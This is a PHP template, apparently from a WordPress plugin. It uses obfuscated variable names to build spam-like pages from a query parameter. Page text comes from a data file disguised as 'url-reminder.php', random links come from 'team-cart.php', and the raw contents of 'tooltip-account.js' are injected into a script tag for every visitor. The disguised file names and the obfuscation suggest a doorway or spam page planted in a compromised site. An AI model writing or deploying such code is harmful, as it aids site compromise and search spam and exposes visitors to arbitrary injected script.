<?php
$ghjqF7 = intval(get_query_var('gjzib'));

if ($ghjqF7 < 1 || $ghjqF7 > 3138) return;
$g0UZWY = file(plugin_dir_path(__FILE__).'url-reminder.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$wSKCe = explode(';', $g0UZWY[$ghjqF7]);
if (count($wSKCe) < 2) return;
$sYnaoVKym = $wSKCe[0];
$ewvUdNGSD  = $wSKCe[1];
$icUhl = $wSKCe[2];
$tbGsNROIeb  = $wSKCe[3];
$trRgbuaE = $wSKCe[4];
set_query_var('bzilig', $sYnaoVKym);

$ibQuRMx5jz = '';
$z7bBj = plugin_dir_path(__FILE__).'team-cart.php';
if (is_file($z7bBj)) {
	$roOnGq = file($z7bBj, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($roOnGq);
	shuffle($roOnGq);
	$in1Gpr = mt_rand(2, 5);
	if (count($roOnGq) > $in1Gpr) {
		for ($rR1aw1w = 0; $rR1aw1w < $in1Gpr; $rR1aw1w++) {
			$rvamiMt = array_shift($roOnGq);
			$ibQuRMx5jz .= '<p><a href="'.$rvamiMt.'">'.$rvamiMt.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $sYnaoVKym; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $ewvUdNGSD . "</p>\n";
				if (strlen($tbGsNROIeb) > 0) echo "<p>" . $tbGsNROIeb . "</p>\n";
				if (strlen($icUhl) > 0) echo "<p>" . $icUhl . "</p>\n";
				if (strlen($trRgbuaE) > 0) echo '<p><a href="#"><img src="'.$trRgbuaE.'"></a>' . "</p>\n";
				echo $ibQuRMx5jz;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$b12PlT2VM = plugin_dir_path(__FILE__) . 'tooltip-account.js';
if (is_file($b12PlT2VM)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($b12PlT2VM);
	echo '</script>';
}
get_footer();
?>
